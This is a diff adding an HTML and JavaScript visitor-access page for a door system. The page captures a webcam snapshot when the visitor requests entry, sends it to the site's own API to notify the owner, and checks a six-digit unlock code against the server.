@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Secure Entry — Visitor</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500&display=swap" rel="stylesheet"/>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{font-family:'Poppins',sans-serif;background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);min-height:100vh;display:flex;align-items:center;justify-content:center;color:#e0f7fa}
+    .card{background:rgba(255,255,255,.06);backdrop-filter:blur(10px);border-radius:18px;padding:36px;width:340px;text-align:center;box-shadow:0 8px 30px rgba(0,0,0,.45);border:1px solid rgba(255,255,255,.12)}
+    h2{margin-bottom:18px}
+    .morph,input{width:100%;padding:12px;border-radius:12px;border:none;margin-top:14px;font-size:15px;transition:.25s}
+    .morph{background:linear-gradient(135deg,#00c9a7,#92fe9d);color:#00332f;font-weight:700;cursor:pointer;box-shadow:0 6px 18px rgba(0,255,180,.18)}
+    .morph[disabled]{opacity:.55;cursor:not-allowed;transform:none}
+    input{background:rgba(255,255,255,.12);color:#fff;text-align:center;outline:none}
+    #result{margin-top:14px;min-height:22px;font-weight:600}
+    video,canvas{display:none}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2><i class="fas fa-door-open"></i> Visitor Access</h2>
+    <video id="preview" autoplay muted playsinline></video>
+    <canvas id="snap" width="320" height="240"></canvas>
+
+    <button id="reqBtn" class="morph" disabled>🔄 Initializing Camera...</button>
+    <input id="codeInput" maxlength="6" placeholder="Enter 6-digit code"/>
+    <button id="unlockBtn" class="morph">🔓 Unlock</button>
+    <div id="result"></div>
+  </div>
+
+<script>
+  const preview = document.getElementById('preview');
+  const snap = document.getElementById('snap');
+  const reqBtn = document.getElementById('reqBtn');
+  const unlockBtn = document.getElementById('unlockBtn');
+  const result = document.getElementById('result');
+  let camReady = false;
+
+  // Start camera
+  async function startCamera(){
+    try{
+      const stream = await navigator.mediaDevices.getUserMedia({video:true});
+      preview.srcObject = stream;
+      preview.onloadedmetadata = () => {
+        preview.play();
+        camReady = true;
+        reqBtn.disabled = false;
+        reqBtn.textContent = "🔔 Request Access";
+      };
+    }catch(err){
+      console.error("Camera error:", err);
+      reqBtn.textContent = "Camera blocked";
+      reqBtn.disabled = true;
+    }
+  }
+  startCamera();
+
+  function show(msg, color='#00f2ff'){
+    result.textContent = msg;
+    result.style.color = color;
+  }
+
+  // Capture + send snapshot, then alert owner
+  reqBtn.addEventListener('click', async ()=>{
+    if(!camReady){ show("Camera not ready", "#ffcc00"); return; }
+    // small delay to ensure frame available
+    await new Promise(r=>setTimeout(r,200));
+    const ctx = snap.getContext('2d');
+    ctx.drawImage(preview, 0, 0, snap.width, snap.height);
+    const blob = await new Promise(res=>snap.toBlob(res,'image/jpeg',0.85));
+    // send snapshot
+    await fetch('/api/visitor_snapshot', { method:'POST', body: blob });
+    // notify owner
+    await fetch('/api/visitor_request', { method:'POST' });
+    show("🔔 Request & snapshot sent to owner", "#00f2ff");
+  });
+
+  // Verify code
+  unlockBtn.addEventListener('click', async ()=>{
+    const code = document.getElementById('codeInput').value.trim();
+    if(code.length!==6 || isNaN(code)){ show("❌ Enter valid 6-digit code", "#ff5c5c"); return; }
+    try{
+      const res = await fetch('/api/verify_code', {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({ code })
+      });
+      const j = await res.json();
+      if(j.result === 'success') show("✅ Door Unlocked", "#00ff99");
+      else if(j.result === 'expired') show("⌛ Code Expired", "#ffb84c");
+      else show("❌ Incorrect Code", "#ff5c5c");
+    }catch(e){
+      console.error(e);
+      show("⚠️ Server error", "#ffffff");
+    }
+  });
+</script>
+</body>
+</html>
